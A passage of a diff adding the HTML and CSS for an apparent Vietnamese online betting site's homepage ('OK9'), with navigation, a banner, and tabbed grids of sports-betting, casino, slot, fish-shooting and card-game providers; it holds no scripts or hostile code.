@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OK9 | TRANG CHỦ</title>
+    <style>
+        /* Reset CSS cơ bản */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #f4f4f4; color: #333; padding-bottom: 70px; } 
+
+        /* =========================================
+           HEADER MỚI (DESKTOP)
+           ========================================= */
+        header { background: #fff; padding: 15px 20px; display: flex; justify-content: center; align-items: center; border-bottom: 1px solid #ddd; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; width: 100%; max-width: 1400px; gap: 15px; }
+        
+        .header-left { display: flex; align-items: center; gap: 20px; }
+        .logo-group { display: flex; align-items: center; gap: 10px; font-size: 32px; font-weight: 900; color: #28a745; letter-spacing: -1px; }
+        .logo-group .divider { color: #28a745; font-weight: 300; font-size: 28px; }
+        .logo-group .afa { color: #000; font-size: 20px; display: flex; align-items: center; gap: 2px;}
+        .small-ok9-box { background: #f7f7f7; padding: 6px 12px; border-radius: 8px; color: #28a745; font-weight: bold; font-size: 14px; border: 1px solid #eee; }
+        .hot-match { display: flex; align-items: center; gap: 8px; font-size: 11px; font-weight: bold; line-height: 1.3; }
+        
+        .desktop-nav { display: flex; gap: 20px; align-items: center; white-space: nowrap; }
+        .desktop-nav a { text-decoration: none; color: #333; font-weight: bold; font-size: 14px; transition: 0.2s; }
+        .desktop-nav a:hover { color: #28a745; }
+        
+        .btn-gameplus { background: #52b848; color: white !important; padding: 6px 16px; border-radius: 8px; display: flex; align-items: center; gap: 6px; box-shadow: 0 3px 6px rgba(76, 175, 80, 0.3); }
+        
+        .nav-item-badge { position: relative; display: inline-block; }
+        .badge-80 { position: absolute; top: -14px; right: -25px; background: red; color: yellow; font-size: 11px; padding: 2px 6px; border-radius: 12px; font-weight: 900; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+        
+        .auth-section { display: flex; align-items: center; gap: 8px; white-space: nowrap; }
+        .support-icon { font-size: 24px; color: #333; }
+        .login-btn { color: #28a745; background: none; border: none; font-size: 15px; font-weight: bold; cursor: pointer; }
+
+        /* Kích thước ảnh Header */
+        .img-logo-main { height: 40px; display: block; object-fit: contain; }
+        .img-logo-small { height: 36px; display: block; border-radius: 6px; }
+        .img-icon-hot { height: 30px; display: block; }
+        .img-icon-gameplus { height: 18px; display: block; }
+        .img-icon-support { height: 26px; cursor: pointer; }
+
+        /* =========================================
+           CSS MODAL ĐĂNG NHẬP/ĐĂNG KÝ (TỪ CODE GỐC)
+           ========================================= */
+        .auth-modal-overlay {
+            display: none; position: fixed; z-index: 9999; left: 0; top: 0;
+            width: 100%; height: 100%; background-color: rgba(0,0,0,0.6);
+            align-items: center; justify-content: center;
+        }
+        .auth-modal-box {
+            background-color: #e8f3ec; border: 4px solid #bde0c9; border-radius: 16px;
+            width: 90%; max-width: 400px; padding: 20px; position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2); font-family: Arial, sans-serif;
+        }
+        .auth-close-btn { position: absolute; top: 10px; right: 15px; font-size: 24px; font-weight: bold; color: #28a745; cursor: pointer; }
+        .auth-header { text-align: center; margin-bottom: 15px; }
+        .auth-main-logo { height: 45px; margin-bottom: 15px; }
+        .auth-partner { display: flex; justify-content: space-between; align-items: center; text-align: left; font-size: 11px; color: #333; border-top: 1px solid #c9e4d3; padding-top: 10px; }
+        .partner-logo { height: 25px; }
+        
+        .input-group {
+            display: flex; align-items: center; background: #fff; border-radius: 8px;
+            padding: 10px 12px; margin-bottom: 12px; border: 1px solid #ddd;
+        }
+        .input-icon { display: flex; align-items: center; justify-content: center; margin-right: 10px; }
+        .input-icon img { width: 18px; height: 18px; object-fit: contain; }
+        .input-group input { border: none; outline: none; width: 100%; font-size: 13px; color: #333; }
+        .input-group:focus-within { border-color: #28a745; }
+
+        .auth-options { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 15px; align-items: center; }
+        .checkbox-container { display: flex; align-items: center; gap: 5px; color: #28a745; font-weight: bold; cursor: pointer; }
+        .forgot-pw { color: #28a745; text-decoration: none; font-weight: bold; }
+
+        .btn-solid-green { width: 100%; background: #4cae4c; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; margin-bottom: 10px; cursor: pointer; box-shadow: 0 4px 0 #3b8c3b; }
+        .btn-outline-green { width: 100%; background: #fff; color: #4cae4c; border: 2px solid #4cae4c; padding: 10px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; }
+        .auth-footer { margin-top: 15px; }
+
+        /* --- Hero Banner --- */
+        .banner { width: 100%; height: 450px; position: relative; overflow: hidden; background-color: #eee; }
+        .slider { width: 100%; height: 100%; }
+        .slides { display: flex; width: 100%; height: 100%; transition: transform 0.5s ease-in-out; }
+        .slides img { width: 100%; height: 100%; object-fit: cover; flex-shrink: 0; }
+
+        /* --- Category Menu --- */
+        .category-wrapper { max-width: 1400px; margin: 25px auto; padding: 0 20px; }
+        .category-menu { background: #fff; display: flex; justify-content: space-between; align-items: center; border-radius: 10px; border: 1px solid #e5e5e5; padding: 6px; }
+        .category-item { display: flex; align-items: center; gap: 8px; padding: 10px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; color: #636b72; font-size: 15px; transition: all 0.2s ease; }
+        .category-icon { width: 20px; height: 25px; object-fit: contain; }
+
+        .category-item:not(.active) { filter: grayscale(100%) opacity(80%); }
+        .category-item:hover:not(.active) { color: #28a745; filter: grayscale(0%) opacity(100%); }
+        .category-item.active { background: linear-gradient(180deg, #4ad95f, #2ca94b); color: white; box-shadow: 0 3px 0 #218838; border: 1px solid #28a745; filter: none; }
+        .category-item.active .category-icon { filter: brightness(0) invert(1); }
+
+        /* --- CSS XỬ LÝ CHUYỂN TAB QUAN TRỌNG --- */
+        .tab-pane { display: none !important; } /* Bắt buộc ẩn các tab chưa chọn */
+        .product-grid.tab-pane.active { display: grid !important; } /* Lưới cho Thể thao/Casino */
+        .game-layout.tab-pane.active { display: flex !important; } /* Khối cho Nổ Hũ */
+
+        /* --- Main Content (Grid Thể thao/Casino) --- */
+        .product-grid { 
+            padding: 0 20px 40px 20px; 
+            grid-template-columns: repeat(4, 1fr); 
+            gap: 20px; 
+            max-width: 1400px; 
+            margin: 0 auto; 
+        }
+        
+        .card { background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; padding-bottom: 20px; position: relative;}
+        .card img { width: 100%; height: auto; display: block; }
+        .card-title { font-weight: bold; margin-top: 15px; font-size: 16px; color: #333; }
+        
+        /* Hiển thị badge Hot cho thẻ đầu tiên */
+        .card .badge-hot { position: absolute; top: 0; left: 0; background: #ff5722; color: #fff; font-size: 12px; font-weight: bold; padding: 4px 10px; border-bottom-right-radius: 12px; display: none;}
+        .card.hot .badge-hot { display: block; }
+
+        .btn-bet { background: #28a745; color: white; border: none; padding: 8px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; display: none; }
+
+        /* =========================================
+           GIAO DIỆN TAB GAME (NỔ HŨ, BẮN CÁ, V.V...)
+           ========================================= */
+        .game-layout { max-width: 1400px; margin: 0 auto; padding: 0 20px 40px 20px; flex-direction: column; gap: 15px; }
+        .game-top-bar { display: flex; justify-content: space-between; gap: 15px; margin-bottom: 10px; }
+        .search-input {
+            flex: 1; padding: 10px 40px 10px 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px;
+            background: #fff url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="%23999" viewBox="0 0 16 16"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>') no-repeat right 15px center; outline: none;
+        }
+        .search-input:focus { border-color: #28a745; }
+        .filter-select { padding: 10px 15px; border: 1px solid #ddd; border-radius: 6px; background: #fff; min-width: 180px; font-size: 14px; outline: none; cursor: pointer; }
+        
+        .game-body { display: flex; gap: 20px; align-items: flex-start; }
+        .game-sidebar { width: 160px; flex-shrink: 0; display: flex; flex-direction: column; gap: 10px; max-height: 700px; overflow-y: auto; padding-right: 5px; }
+        .game-sidebar::-webkit-scrollbar { width: 5px; height: 5px; }
+        .game-sidebar::-webkit-scrollbar-thumb { background: #ccc; border-radius: 5px; }
+        .game-sidebar::-webkit-scrollbar-thumb:hover { background: #aaa; }
+        
+        .provider-item { background: #fff; border-radius: 8px; padding: 15px 5px; text-align: center; cursor: pointer; box-shadow: 0 1px 4px rgba(0,0,0,0.05); position: relative; transition: all 0.2s ease; border: 1px solid #eee; display: flex; flex-direction: column; align-items: center; }
+        .provider-item:hover { border-color: #28a745; }
+        
+        /* CSS cho logo dạng ảnh hoặc chữ sảnh game */
+        .provider-logo-img { height: 35px; width: auto; object-fit: contain; margin-bottom: 5px; display: block; }
+        .provider-logo-text { font-size: 24px; font-weight: 900; margin-bottom: 5px; line-height: 1; }
+        .provider-name { font-size: 11px; color: #666; font-weight: bold; }
+        
+        .provider-item .badge-hot { position: absolute; top: -5px; right: -5px; background: red; color: yellow; font-size: 10px; padding: 2px 5px; border-radius: 10px; z-index: 10; }
+        .provider-item.active { background: #28a745; border-color: #28a745; }
+        .provider-item.active .provider-logo-text, .provider-item.active .provider-name { color: #fff !important; }
+        .provider-item.active::after { content: ""; position: absolute; top: 50%; right: -10px; transform: translateY(-50%); border-width: 10px 0 10px 10px; border-style: solid; border-color: transparent transparent transparent #28a745; }
+        
+        .sub-game-grid { flex: 1; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px; }
+        .sub-game-card { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; cursor: pointer; transition: 0.2s; border: 1px solid #eee; }
+        .sub-game-card:hover { transform: translateY(-3px); box-shadow: 0 5px 12px rgba(0,0,0,0.15); border-color: #28a745; }
+        .sub-game-card img { width: 100%; aspect-ratio: 1/1; object-fit: cover; display: block; background-color: #fafafa; }
+        .sub-game-title { padding: 8px 5px; font-size: 11px; font-weight: bold; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        /* --- Mobile Bottom Nav --- */
+        .mobile-bottom-nav { display: none; position: fixed; bottom: 0; width: 100%; background: #fff; border-top: 1px solid #ddd; padding: 10px 0; justify-content: space-around; z-index: 1000; }
+        .mobile-bottom-nav div { text-align: center; font-size: 12px; color: #666; font-weight: bold; }
+
+        /* =========================================
+           GIAO DIỆN ĐIỆN THOẠI (Mobile - KẾ THỪA CODE GỐC)
+           ========================================= */
+        @media (max-width: 1100px) {
+            header { padding: 10px 10px; }
+            .desktop-nav, .small-logo, .hot-match, .img-icon-support { display: none !important; }
+            .header-container { justify-content: space-between; gap: 10px; }
+            .img-logo-main { height: 30px !important; max-width: 140px; object-fit: contain; }
+            .auth-section { flex: 1; display: flex; justify-content: flex-end; }
+            .login-btn { font-size: 14px !important; font-weight: bold; color: #027214 !important; white-space: nowrap; padding: 5px 10px; }
+            .banner { height: 140px !important; } 
+
+            .category-wrapper { padding: 0 10px; margin: 10px auto 5px; }
+            .category-menu { justify-content: flex-start; overflow-x: auto; padding: 5px 0 10px 0; gap: 10px; border: none; scrollbar-width: none; }
+            .category-menu::-webkit-scrollbar { display: none; } 
+            .category-item { flex-direction: column; min-width: 82px; padding: 10px 5px; border: 1px solid #ddd; border-radius: 8px; gap: 5px; font-size: 13px; box-shadow: none !important; background: #fff; }
+            .category-icon { width: 32px; height: 32px; }
+            
+            /* Lưới cho Thể thao/Casino di động */
+            .product-grid { grid-template-columns: 1fr; padding: 10px; gap: 15px; }
+            .card { display: block; position: relative; padding: 0; border: 1px solid #eee; border-radius: 12px; box-shadow: none; }
+            .card img { border-radius: 12px; }
+            .card-title { position: absolute; left: 20px; bottom: 45px; margin: 0; font-size: 14px; z-index: 2; color: #000; }
+            .btn-bet { display: block !important; position: absolute; left: 20px; bottom: 12px; padding: 6px 15px; font-size: 12px; z-index: 2; }
+            
+            /* Lưới và Layout cho Nổ Hũ di động */
+            .game-top-bar { flex-direction: column; gap: 10px; }
+            .game-body { flex-direction: column; gap: 12px; }
+            .game-sidebar { width: 100%; flex-direction: row; overflow-x: auto; overflow-y: hidden; padding-bottom: 8px; max-height: none; }
+            .game-sidebar::-webkit-scrollbar { height: 3px; display: none; }
+            .provider-item { min-width: 100px; padding: 10px 5px; }
+            .provider-item.active::after { top: auto; bottom: -10px; right: 50%; transform: translateX(50%); border-width: 10px 10px 0 10px; border-color: #28a745 transparent transparent transparent; }
+            .sub-game-grid { grid-template-columns: repeat(3, 1fr); width: 100%; }
+            .sub-game-title { font-size: 10px; }
+
+            /* Bottom Nav */
+            .mobile-bottom-nav { display: flex; align-items: center; padding: 8px 0 5px 0; }
+            .mobile-bottom-nav div { flex: 1; text-align: center; font-size: 11px; }
+            .mobile-bottom-nav img { width: 24px; height: 24px; object-fit: contain; display: block; margin: 0 auto 3px auto; }
+            .mobile-bottom-nav div:nth-child(2) { background: none; color: #28a745 !important; padding: 0; border-radius: 0; margin-top: -15px; }
+            .mobile-bottom-nav div:nth-child(2) img { width: 38px; height: 38px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Mới -->
+    <header>
+        <div class="header-container">
+            <div class="header-left">
+                <a href="#" class="main-logo">
+                    <img src="images/logochinh.jpg" alt="OK9 AFA Logo" class="img-logo-main">
+                </a>
+                <a href="#" class="small-logo">
+                    <img src="images/logonho.jpg" alt="OK9 Small" class="img-logo-small">
+                </a>
+                <div class="hot-match">
+                    <img src="images/trancautamdiem.jpg" alt="Trận Cầu" class="img-icon-hot">
+                </div>
+            </div>
+
+            <nav class="desktop-nav">
+                <a href="#">TRONG TRẬN</a>
+                <a href="#">HÔM NAY</a>
+                <a href="#">SỚM</a>
+                <a href="#">CƯỢC XIÊN</a>
+                <a href="#">QUÁN QUÂN</a>
+                <a href="#">KẾT QUẢ</a>
+                <a href="#" class="btn-gameplus">
+                    <img src="images/logogame.jpg" alt="Game+" class="img-icon-gameplus"> GAME+
+                </a>
+                <a href="#">KHUYẾN MÃI</a>
+                <a href="#">THƯƠNG HIỆU</a>
+                <div class="nav-item-badge">
+                    <a href="#">ĐẠI LÝ</a>
+                    <span class="badge-80">+80%</span>
+                </div>
+                <a href="#">TÀI KHOẢN</a>
+            </nav>
+
+            <div class="auth-section">
+                <img src="images/iconcskh.jpg" alt="CSKH" class="img-icon-support">
+                <button class="login-btn">Đăng Nhập | Đăng Ký</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Banner -->
+    <section class="banner">
+        <div class="slider">
+            <div class="slides">
+                <img src="images/banner1.jpg" alt="Banner 1">
+                <img src="images/banner2.jpg" alt="Banner 2">
+            </div>
+        </div>
+    </section>
+
+    <!-- Categories (Đã thêm data-target để js nhận diện) -->
+    <div class="category-wrapper">
+        <nav class="category-menu">
+            <div class="category-item active" data-target="tab-thethao">
+                <img src="images/thethao.jpg" alt="Thể Thao" class="category-icon"> Thể Thao
+            </div>
+            <div class="category-item" data-target="tab-casino">
+                <img src="images/casino.jpg" alt="Casino" class="category-icon"> Casino
+            </div>
+            <div class="category-item" data-target="tab-nohu">
+                <img src="images/nohu.jpg" alt="Nổ Hũ" class="category-icon"> Nổ Hũ
+            </div>
+            <div class="category-item" data-target="tab-banca">
+                <img src="images/banca.jpg" alt="Bắn Cá" class="category-icon"> Bắn Cá
+            </div>
+            <div class="category-item" data-target="tab-gamebai">
+                <img src="images/gamebai.jpg" alt="Game Bài" class="category-icon"> Game Bài
+            </div>
+            <div class="category-item" data-target="tab-xoso">
+                <img src="images/xoso.jpg" alt="Xổ Số" class="category-icon"> Xổ Số
+            </div>
+        </nav>
+    </div>
+
+    <!-- MAIN CONTENT KHU VỰC CÁC TAB -->
+    <main class="content-area">
+        
+        <!-- TAB THỂ THAO -->
+        <div id="tab-thethao" class="product-grid tab-pane active">
+            <div class="card hot">
+                <span class="badge-hot">Hot</span>
+                <img src="images/saba.jpg" alt="SABA Thể Thao">
+                <div class="card-title">SABA Thể Thao</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/bti.jpg" alt="BTi Thể Thao">
+                <div class="card-title">BTi Thể Thao</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/cmd.jpg" alt="CMD 368 Thể Thao">
+                <div class="card-title">CMD 368 Thể Thao</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/img.jpg" alt="IM E-Sports">
+                <div class="card-title">IM E-Sports</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+        </div>
+
+        <!-- TAB CASINO (Được dựng theo image_3d3521.jpg) -->
+        <div id="tab-casino" class="product-grid tab-pane">
+            <div class="card hot">
+                <span class="badge-hot">Hot</span>
+                <img src="images/casinosexy.webp" alt="SEXY Casino">
+                <div class="card-title">SEXY Casino</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/casinodg.webp" alt="DG Casino">
+                <div class="card-title">DG Casino</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/casinoevolution.webp" alt="EVO Casino">
+                <div class="card-title">EVO Casino</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/casinobg.webp" alt="BG Casino">
+                <div class="card-title">BG Casino</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/casinosa.webp" alt="SA Casino">
+                <div class="card-title">SA Casino</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/casinomt.webp" alt="MT Casino">
+                <div class="card-title">MT Casino</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/casinowm.webp" alt="WM Casino">
+                <div class="card-title">WM Casino</div>
+                <button class="btn-bet">CƯỢC NGAY</button>
+            </div>
+            <div class="card">
+                <img src="images/casinodangcapnhat.webp" alt="Đang Cập Nhật">
+                <div class="card-title">Đang Cập Nhật</div>
+                
+            </div>
+        </div>
+
+        <!-- TAB NỔ HŨ -->
+        <div id="tab-nohu" class="game-layout tab-pane">
+            
+            <!-- 1. Thanh tìm kiếm và lọc -->
+            <div class="game-top-bar">
+                <input type="text" class="search-input" placeholder="Tìm kiếm trò chơi">
+                <select class="filter-select">
+                    <option>Tất cả trò chơi</option>
+                    <option>Trò chơi Mới</option>
+                    <option>Trò chơi Hot</option>
+                </select>
+            </div>
+
+            <!-- 2. Thân tab -->
+            <div class="game-body">
+                
+                <!-- CỘT BÊN TRÁI: Các Sảnh (Provider) -->
+                <div class="game-sidebar">
+                    <div class="provider-item active">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                        <!-- Nếu có ảnh logo thì dùng <img>, ở đây giả lập bằng text -->
+                        <div class="provider-logo-text" style="color: #fff;">168G</div>
+                        <div class="provider-name">168Game Nổ Hũ</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                        <div class="provider-logo-text" style="color: #333;">PG</div>
+                        <div class="provider-name">PG Nổ Hũ</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #d4af37;">JL</div>
+                        <div class="provider-name">JILI Nổ Hũ</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #1e90ff;">FC</div>
+                        <div class="provider-name">FC Nổ Hũ</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #ff4500;">AS</div>
+                        <div class="provider-name">AS Nổ Hũ</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #fca311;">CQ9</div>
+                        <div class="provider-name">CQ9 Nổ Hũ</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #6a4c93;">JDB</div>
+                        <div class="provider-name">JDB Nổ Hũ</div>
+                    </div>
+                </div>
+
+                <!-- CỘT BÊN PHẢI: Lưới Trò Chơi -->
+                <div class="sub-game-grid">
+                    
+                    <!-- Khối game mẫu -->
+                    <div class="sub-game-card">
+                        <img src="images/quyetchien168.webp" alt="Quyết Chiến">
+                        <div class="sub-game-title">QUYẾT CHIẾN TIỀN...</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/olympus168.webp" alt="Olympus">
+                        <div class="sub-game-title">DI SẢN OLYMPUS...</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/umatchuoc168.webp" alt="Ù Mạt Chược">
+                        <div class="sub-game-title">Ù MẠT CHƯỢC</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/umatchuoc2-168.webp" alt="Ù Mạt Chược 2">
+                        <div class="sub-game-title">Ù MẠT CHƯỢC 2</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/khobauaztec168.webp" alt="Kho báu Aztec">
+                        <div class="sub-game-title">KHO BÁU AZTEC 2</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/neko168.webp" alt="Neko">
+                        <div class="sub-game-title">Neko May Mắn</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/thomayman168.webp" alt="Thỏ May Mắn">
+                        <div class="sub-game-title">Thỏ May Mắn Nổ</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/heodisco168.webp" alt="Heo Disco">
+                        <div class="sub-game-title">Heo Disco</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/tuimayman168.webp" alt="Túi May Mắn">
+                        <div class="sub-game-title">Túi May Mắn</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/khobauaztec2.webp" alt="Kho Báu Aztec 2">
+                        <div class="sub-game-title">Kho Báu Aztec 2</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/neko_2.webp" alt="Neko May Mắn 2">
+                        <div class="sub-game-title">Neko May Mắn 2</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/nekocuoinam.webp" alt="Neko Cuối Năm">
+                        <div class="sub-game-title">Neko Cuối Năm</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/olympus2168.webp" alt="Olympus">
+                        <div class="sub-game-title">Olympus</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/cuoinamcaocap.webp" alt="Cuối Năm Cao Cấp">
+                        <div class="sub-game-title">Cuối Năm Cao Cấp</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/demcocktail.webp" alt="Đêm Cocktail">
+                        <div class="sub-game-title">Đêm Cocktail</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/sieuthuace2.webp" alt="Siêu Thủ Ace 2">
+                        <div class="sub-game-title">Siêu Thủ Ace 2</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/sieusacduphong.webp" alt="Siêu Sạc Dự Phòng">
+                        <div class="sub-game-title">Siêu Sạc Dự Phòng</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/sieuthuace.webp" alt="Siêu Thủ Ace">
+                        <div class="sub-game-title">Siêu Thủ Ace</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/suphu2.webp" alt="Sư Phụ Wada 2">
+                        <div class="sub-game-title">Sư Phụ Wada 2</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/suphu.webp" alt="Sư Phụ Wada">
+                        <div class="sub-game-title">Sư Phụ Wada</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/suphu3.webp" alt="Sư Phụ Wada 3">
+                        <div class="sub-game-title">Sư Phụ Wada 3</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/kylanmachnuoc.webp" alt="Kỳ Lân Mách Nước">
+                        <div class="sub-game-title">Kỳ Lân Mách Nước</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/wilddaotac.webp" alt="Wild Đạo Tặc">
+                        <div class="sub-game-title">Wild Đạo Tặc</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/quyetchien2.webp" alt="Quyết CHiến Tiền Thưởng Khủng 2">
+                        <div class="sub-game-title">Quyết CHiến Tiền Thưởng Khủng 2</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/quyetchien3.webp" alt="Quyết Chiến Tiền Thưởng Khủng">
+                        <div class="sub-game-title">Quyết Chiến Tiền Thưởng Khủng</div>
+                    </div>                
+                     <!-- Bạn có thể copy paste thêm các .sub-game-card cho đến khi đổ đầy lưới -->
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB BAN CA -->
+        <div id="tab-banca" class="game-layout tab-pane">
+            
+            <!-- 1. Thanh tìm kiếm và lọc -->
+            <div class="game-top-bar">
+                <input type="text" class="search-input" placeholder="Tìm kiếm trò chơi">
+                <select class="filter-select">
+                    <option>Tất cả trò chơi</option>
+                    <option>Trò chơi Mới</option>
+                    <option>Trò chơi Hot</option>
+                </select>
+            </div>
+
+            <!-- 2. Thân tab -->
+            <div class="game-body">
+                
+                <!-- CỘT BÊN TRÁI: Các Sảnh (Provider) -->
+                <div class="game-sidebar">
+                    <div class="provider-item active">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                      
+                        <div class="provider-logo-text" style="color: #f8f401;">JL</div>
+                        <div class="provider-name">JILI Bắn Cá</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                        <div class="provider-logo-text" style="color: #333;">CQ9</div>
+                        <div class="provider-name">CQ9 Bắn Cá</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #d4af37;">JDB</div>
+                        <div class="provider-name">JDB Bắn Cá</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #1e90ff;">FC</div>
+                        <div class="provider-name">FC Bắn Cá</div>
+                    </div>
+                    
+                    
+                </div>
+
+                <!-- CỘT BÊN PHẢI: Lưới Trò Chơi -->
+                <div class="sub-game-grid">
+                    
+                    <!-- Khối game mẫu -->
+                    <div class="sub-game-card">
+                        <img src="images/dansaodanhca.webp" alt="Dàn Sao Đánh Cá">
+                        <div class="sub-game-title">Dàn Sao Đánh Cá</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/bombing.webp" alt="BomBing">
+                        <div class="sub-game-title">BomBing</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/doatbao.webp" alt="Đoạt Bảo Truyền Kỳ">
+                        <div class="sub-game-title">Đoạt Bảo Truyền Kỳ</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/chuyengiarong.webp" alt="Chuyên Gia Săn Rồng">
+                        <div class="sub-game-title">Chuyên Gia Săn Rồng</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/nhatuban2.webp" alt="Nhà Tư Bản Khủng Long 2">
+                        <div class="sub-game-title">NHÀ TƯ BẢN KHỦNG LONG 2</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/philongtangbao.webp" alt="Phi Long Tàng Bảo">
+                        <div class="sub-game-title">Phi Long Tàng Bảo</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/danhcavuive.webp" alt="Đánh Cá Vui Vẻ">
+                        <div class="sub-game-title">Đánh Cá Vui Vẻ</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/vuadanhca.webp" alt="Vua Đánh Cá">
+                        <div class="sub-game-title">Vua Đánh Cá</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/tienlongdanhca.webp" alt="Tiền Long Đánh Cá">
+                        <div class="sub-game-title">Tiền Long Đánh Cá</div>
+                    </div>
+                    
+                     <!-- Bạn có thể copy paste thêm các .sub-game-card cho đến khi đổ đầy lưới -->
+                </div>
+            </div>
+        </div>
+
+         <!-- TAB GAME BAI -->
+        <div id="tab-gamebai" class="game-layout tab-pane">
+            
+            <!-- 1. Thanh tìm kiếm và lọc -->
+            <div class="game-top-bar">
+                <input type="text" class="search-input" placeholder="Tìm kiếm trò chơi">
+                <select class="filter-select">
+                    <option>Tất cả trò chơi</option>
+                    <option>Trò chơi Mới</option>
+                    <option>Trò chơi Hot</option>
+                </select>
+            </div>
+
+            <!-- 2. Thân tab -->
+            <div class="game-body">
+                
+                <!-- CỘT BÊN TRÁI: Các Sảnh (Provider) -->
+                <div class="game-sidebar">
+                    <div class="provider-item active">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                      
+                        <div class="provider-logo-text" style="color: #f8f401;">V8</div>
